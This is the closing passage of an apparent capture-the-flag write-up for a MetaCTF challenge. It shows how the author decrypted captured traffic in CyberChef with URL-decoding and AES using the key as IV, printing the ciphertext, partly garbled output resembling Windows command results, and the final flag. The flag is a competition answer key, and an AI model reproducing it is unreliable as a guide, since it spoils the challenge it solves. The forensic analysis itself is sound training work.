+</span></code></pre><p>After a <em>lot</em> of tinkering with CyberChef:<ul><li>stripping the form-field prefix<li>URL-decoding the input<li>AES decrypting it (with the key as both key and IV)<li>dropping the first 16 bytes</ul><p>…the final payload being:<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>rbqA0td2aIZzzE4Q5LYitDDQcpMz%2FgSbMWbTceiStH3ZK8VvGQxF%2BOc7%2Fp2PSgDw
+</span><span>oL%2FlVfK65Jw4qEiwQGpqhX8OEFEgtkKe%2FN9JA85y7Ur%2BiXZy1QipEYrMYARwm3hNEeIBhGkrQk5ypfdZQ51lPE4Bsn7RNiD6mrzzFd%2FJfgSceATcyB8kxAs0xrvOfTYW
+</span><span>I5liQ%2FBaSNMb1PhIVz8LMltNpCrmF4ThvykJwL0CKa8%3D
+</span><span>I4xR%2BpGs07nJ6IyqZSzTH%2FABiKzvZac2UYjjj5ZpOMdMQdV1LYoOCeBniQKjwsSNxLmqodg1ZbJ%2FQ9vErtoMxfMvMSJ6fsAcP4myqxD%2FLMjANpm9XPp9LdNjU9w3Stpm
+</span><span>wRMk5d%2FagURzTFrvU4E3Y2TJBuPKr9hdyoxzy59a3WQ%3D
+</span><span>OvY2N3B4gzO%2FYIT6Kjy9%2Bp9EhFmCVEYXl3AD4qHWNbw8T7hSq%2F5PTiKmB8nSN8%2BgtDy4hOIZwOWN8Emz%2BiiIM7GBivi%2F0hmfREPF%2BrWutMGCGM%2Bxfe36h3AG
+</span></code></pre><p>…that decrypts to:<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>VALID desktop\ieuser
+</span><span>
+</span><span>         C ±®WvYÇRÀLÉ/òwÄVALID 
+</span><span>Path                   
+</span><span>----                   
+</span><span>C:\Users\IEUser\DesktoÝ§êb*×+²÷¾"VALID 
+</span><span>         KùÕW\YßÍÜÄÆ&VALID 
+</span><span>camuduon69.ps1 : The term 'camuduon69.ps1' is not recognized as the name 6ãÅ}n5+pE|VALID 
+</span><span>         AU6¾ãX5ábAVALID MetaCTF
+</span><span>4nh_k0_4n_mun9_9c9f6732d87c6d0f1625b4d73639f34d
+</span><span>o´Ç6û';þ£o&
+</span></code></pre><p>…which is kinda garbage but kinda discernable at the end there:<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>MetaCTF{4nh_k0_4n_mun9_9c9f6732d87c6d0f1625b4d73639f34d}
+</span></code></pre></article><hr><nav id=post-nav><a class="post-nav-item post-nav-prev" href=https://blog.psypherpunk.io/blog/metactf-june-2024-flash-ctf/> <div class=nav-arrow>Previous</div> <span class=post-title>️🏴 MetaCTF June 2024 Flash CTF</span> </a><a class="post-nav-item post-nav-next" href=https://blog.psypherpunk.io/blog/metactf-august-2024-flash-ctf/> <div class=nav-arrow>Next</div> <span class=post-title>️🏴 MetaCTF August 2024 Flash CTF</span> </a></nav></main><footer id=site-footer><nav><ul><li><a href=https://blog.psypherpunk.io/blog/>Blog</a></ul></nav><p>© 2025 PsypherPunk<ul id=socials><li><a rel=" me" href=https://github.com/PsypherPunk title=GitHub> <i style="--icon:url(&#34;data:image/svg+xml,%3Csvg role='img' viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EGitHub%3C/title%3E%3Cpath d='M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12'/%3E%3C/svg%3E&#34;)" class=icon></i> <span>GitHub</span> </a><li><a rel=" me" href=https://hachyderm.io/@psypherpunk title=Mastodon> <i style="--icon:url(&#34;data:image/svg+xml,%3Csvg role='img' viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EMastodon%3C/title%3E%3Cpath d='M23.268 5.313c-.35-2.578-2.617-4.61-5.304-5.004C17.51.242 15.792 0 11.813 0h-.03c-3.98 0-4.835.242-5.288.309C3.882.692 1.496 2.518.917 5.127.64 6.412.61 7.837.661 9.143c.074 1.874.088 3.745.26 5.611.118 1.24.325 2.47.62 3.68.55 2.237 2.777 4.098 4.96 4.857 2.336.792 4.849.923 7.256.38.265-.061.527-.132.786-.213.585-.184 1.27-.39 1.774-.753a.057.057 0 0 0 .023-.043v-1.809a.052.052 0 0 0-.02-.041.053.053 0 0 0-.046-.01 20.282 20.282 0 0 1-4.709.545c-2.73 0-3.463-1.284-3.674-1.818a5.593 5.593 0 0 1-.319-1.433.053.053 0 0 1 .066-.054c1.517.363 3.072.546 4.632.546.376 0 .75 0 1.125-.01 1.57-.044 3.224-.124 4.768-.422.038-.008.077-.015.11-.024 2.435-.464 4.753-1.92 4.989-5.604.008-.145.03-1.52.03-1.67.002-.512.167-3.63-.024-5.545zm-3.748 9.195h-2.561V8.29c0-1.309-.55-1.976-1.67-1.976-1.23 0-1.846.79-1.846 2.35v3.403h-2.546V8.663c0-1.56-.617-2.35-1.848-2.35-1.112 0-1.668.668-1.67 1.977v6.218H4.822V8.102c0-1.31.337-2.35 1.011-3.12.696-.77 1.608-1.164 2.74-1.164 1.311 0 2.302.5 2.962 1.498l.638 1.06.638-1.06c.66-.999 1.65-1.498 2.96-1.498 1.13 0 2.043.395 2.74 1.164.675.77 1.012 1.81 1.012 3.12z'/%3E%3C/svg%3E&#34;)" class=icon></i> <span>Mastodon</span> </a><li><a rel=" me" href=https://twitter.com/PsypherPunk title=Twitter> <i style="--icon:url(&#34;data:image/svg+xml,%3Csvg role='img' viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3ETwitter%3C/title%3E%3Cpath d='M21.543 7.104c.015.211.015.423.015.636 0 6.507-4.954 14.01-14.01 14.01v-.003A13.94 13.94 0 0 1 0 19.539a9.88 9.88 0 0 0 7.287-2.041 4.93 4.93 0 0 1-4.6-3.42 4.916 4.916 0 0 0 2.223-.084A4.926 4.926 0 0 1 .96 9.167v-.062a4.887 4.887 0 0 0 2.235.616A4.928 4.928 0 0 1 1.67 3.148 13.98 13.98 0 0 0 11.82 8.292a4.929 4.929 0 0 1 8.39-4.49 9.868 9.868 0 0 0 3.128-1.196 4.941 4.941 0 0 1-2.165 2.724A9.828 9.828 0 0 0 24 4.555a10.019 10.019 0 0 1-2.457 2.549z'/%3E%3C/svg%3E&#34;)" class=icon></i> <span>Twitter</span> </a></ul></footer>
